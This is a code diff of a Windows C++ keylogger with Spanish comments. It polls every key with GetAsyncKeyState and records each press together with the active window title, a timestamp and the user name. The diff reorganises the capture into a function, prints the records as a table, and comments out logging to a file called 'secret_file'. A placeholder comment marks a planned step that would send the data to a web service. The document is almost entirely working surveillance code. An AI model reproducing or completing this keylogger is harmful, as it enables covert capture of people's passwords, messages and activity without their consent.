@@ -7,178 +7,306 @@
 
 using namespace std;
 
-TCHAR username[UNLEN + 1];
-DWORD username_len = UNLEN + 1;
+//Variables globales de entorno de ejecución y sus funciones de asignación
+string window;
+string timestamp;
+string name;
 
+void Entorno() {
+	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
+	char* wnd_title = (char*)malloc(SizeOfTitleBarText + 1);
+	GetWindowText(GetForegroundWindow(), wnd_title, SizeOfTitleBarText + 1);
+	window = wnd_title;
+	free(wnd_title);
+
+	std::time_t time = std::time(nullptr);
+	timestamp = std::to_string(time);
+
+	TCHAR username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+	GetUserName((TCHAR*)username, &username_len);
+	name = username;
+}
+
+/*
 void EscribirArchivo(LPCSTR texto) {
 	ofstream archivo;
 	archivo.open("secret_file", fstream::app);
 	archivo << texto;
 	archivo.close();
 }
+*/
+
+struct tecla {
+	string tiempo;
+	string ventana;
+	string key;
+	string nombre;
+} str_key;
 
 bool TeclasPulsadas(int tecla) {
+	Entorno();
+	str_key.ventana = window;
+	str_key.tiempo = timestamp;
+	str_key.nombre = "" + name + "_" + timestamp;
 	switch (tecla) {
 	case VK_SPACE:
 		// Process the SPACE key.
-		cout << " ";
-		EscribirArchivo(" ");
+		str_key.key = "{ESPACIO}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{ESPACIO}");
 		return true;
 		break;
 	case VK_RETURN:
 		// Process the ENTER key.
-		cout << "\n";
-		EscribirArchivo(" {INTRO} ");
+		cout << "\r\n";
+		str_key.key = "{INTRO}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{INTRO}");
 		return true;
 		break;
 	case VK_SHIFT:
 		// Process the SHIFT key.
-		cout << " {SHIFT} ";
-		EscribirArchivo(" {SHIFT} ");
+		str_key.key = "{SHIFT}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{SHIFT}");
 		return true;
 		break;
 	case VK_BACK:
 		// Process the BACK SPACE key.
-		cout << " {RETROCESO} ";
-		EscribirArchivo(" {RETROCESO} ");
+		str_key.key = "{RETROCESO}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{RETROCESO}");
 		return true;
 		break;
 	case VK_LEFT:
 		// Process the LEFT ARROW key.
-		cout << " {LEFT} ";
-		EscribirArchivo(" {LEFT} ");
+		str_key.key = "{LEFT}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{LEFT}");
 		return true;
 		break;
 	case VK_RIGHT:
 		// Process the RIGHT ARROW key.
-		cout << " {RIGHT} ";
-		EscribirArchivo(" {RIGHT} ");
+		str_key.key = "{RIGHT}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{RIGHT}");
 		return true;
 		break;
 
 	case VK_UP:
 		// Process the UP ARROW key. 
-		cout << " {UP} ";
-		EscribirArchivo(" {UP} ");
+		str_key.key = "{UP}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{UP}");
 		return true;
 		break;
 
 	case VK_DOWN:
 		// Process the DOWN ARROW key. 
-		cout << " {DOWN} ";
-		EscribirArchivo(" {DOWN} ");
+		str_key.key = "{DOWN}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{DOWN}");
 		return true;
 		break;
 
 	case VK_HOME:
 		// Process the HOME key. 
-		cout << " {HOME} ";
-		EscribirArchivo(" {HOME} ");
+		str_key.key = "{HOME}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{HOME}");
 		return true;
 		break;
 
 	case VK_END:
 		// Process the END key. 
-		cout << " {END} ";
-		EscribirArchivo(" {END} ");
+		str_key.key = "{END}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{END}");
 		return true;
 		break;
 
 	case VK_INSERT:
 		// Process the INS key.
-		cout << " {INSERT} ";
-		EscribirArchivo(" {INSERT} ");
+		str_key.key = "{INSERT}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{INSERT}");
 		return true;
 		break;
 
 	case VK_DELETE:
 		// Process the DEL key. 
-		cout << " {DELETE} ";
-		EscribirArchivo(" {DELETE} ");
+		str_key.key = "{DELETE}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{DELETE}");
 		return true;
 		break;
 
 	case VK_F1:
 		// Process the F1 key.
-		cout << " {F1} ";
-		EscribirArchivo(" {F1} ");
+		str_key.key = "{F1}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F1}");
 		return true;
 		break;
 
 	case VK_F2:
 		// Process the F2 key.
-		cout << " {F2} ";
-		EscribirArchivo(" {F2} ");
+		str_key.key = "{F2}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F2}");
 		return true;
 		break;
 
 	case VK_F3:
 		// Process the F3 key.
-		cout << " {F3} ";
-		EscribirArchivo(" {F3} ");
+		str_key.key = "{F3}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F3}");
 		return true;
 		break;
 
 	case VK_F4:
 		// Process the F4 key.
-		cout << " {F4} ";
-		EscribirArchivo(" {F4} ");
+		str_key.key = "{F4}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F4}");
 		return true;
 		break;
 
 	case VK_F5:
 		// Process the F5 key.
-		cout << " {F5} ";
-		EscribirArchivo(" {F5} ");
+		str_key.key = "{F5}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F5}");
 		return true;
 		break;
 
 	case VK_F6:
 		// Process the F6 key.
-		cout << " {F6} ";
-		EscribirArchivo(" {F6} ");
+		str_key.key = "{F6}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F6}");
 		return true;
 		break;
 
 	case VK_F7:
 		// Process the F7 key.
-		cout << " {F7} ";
-		EscribirArchivo(" {F7} ");
+		str_key.key = "{F7}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F7}");
 		return true;
 		break;
 
 	case VK_F8:
 		// Process the F8 key.
-		cout << " {F8} ";
-		EscribirArchivo(" {F8} ");
+		str_key.key = "{F8}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F8}");
 		return true;
 		break;
 
 	case VK_F9:
-		// Process the F1 key.
-		cout << " {F9} ";
-		EscribirArchivo(" {F9} ");
+		// Process the F9 key.
+		str_key.key = "{F9}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F9}");
 		return true;
 		break;
 
 	case VK_F10:
 		// Process the F10 key.
-		cout << " {F10} ";
-		EscribirArchivo(" {F10} ");
+		str_key.key = "{F10}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F10}");
 		return true;
 		break;
 
 	case VK_F11:
 		// Process the F11 key.
-		cout << " {F11} ";
-		EscribirArchivo(" {F11} ");
+		str_key.key = "{F11}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F11}");
 		return true;
 		break;
 
 	case VK_F12:
 		// Process the F12 key.
-		cout << " {F12} ";
-		EscribirArchivo(" {F12} ");
+		str_key.key = "{F12}";
+		cout << str_key.key + "\t";
+		cout << str_key.ventana + "\t";
+		cout << str_key.tiempo + "\t";
+		cout << str_key.nombre + "\n";
+		//EscribirArchivo("{F12}");
 		return true;
 		break;
 
@@ -186,21 +314,16 @@ bool TeclasPulsadas(int tecla) {
 	}
 }
 
-HWND GetWindow() {
-	HWND ventana = NULL;
-	return ventana = GetForegroundWindow(); //Ventana activa que tiene capturada la entrada del teclado
-}
-
-struct tecla {
-	string tiempo;
-	string ventana;
-	char key;
-	string nombre;
-} tecla;
-
 int main() {
 	//FreeConsole();
 	unsigned char key;
+
+	//Desplegar Encabezados
+	cout << "Tecla\t\t\t";
+	cout << "Ventana\t\t\t";
+	cout << "Timestamp\t\t\t";
+	cout << "Nombre\n";
+	cout << "----------------------------------------------------------------------------\n";
 	
 	while (TRUE) {
 		Sleep(10);
@@ -209,36 +332,23 @@ int main() {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
-					const int SizeOfTitleBarText = GetWindowTextLength(GetWindow());
-					char *wnd_title = (char*)malloc(SizeOfTitleBarText+1);
-					GetWindowText(GetWindow(), wnd_title, SizeOfTitleBarText+1);
-					std::time_t time = std::time(nullptr);
-					GetUserName((TCHAR*)username, &username_len);	//Obtención del nombre de usuario
-					//cout << wnd_title;
-					//cout << std::to_string(time);
-
-					//Asignación de las variables de la estructura
-					tecla.key = key;
-					tecla.ventana = wnd_title;
-					string timestamp = std::to_string(time);
-					tecla.tiempo = timestamp;
-					string name = username;
-					tecla.nombre = ""+name+"_"+timestamp;
+					str_key.key = key;
 
 					//Envío al web service
 
 					//Impresión de depuración
-					cout << tecla.key;
-					cout << tecla.ventana;
-					cout << tecla.tiempo;
-					cout << tecla.nombre;
+					cout << str_key.key+"\t";
+					cout << str_key.ventana+"\t";
+					cout << str_key.tiempo+"\t";
+					cout << str_key.nombre+"\n";
 
 					//Volcado a archivo
+					/*
 					ofstream archivo;
 					archivo.open("secret_file", fstream::app);
 					archivo << key;
 					archivo.close();
-					free(wnd_title);
+					*/
 				}
 			}
 		}
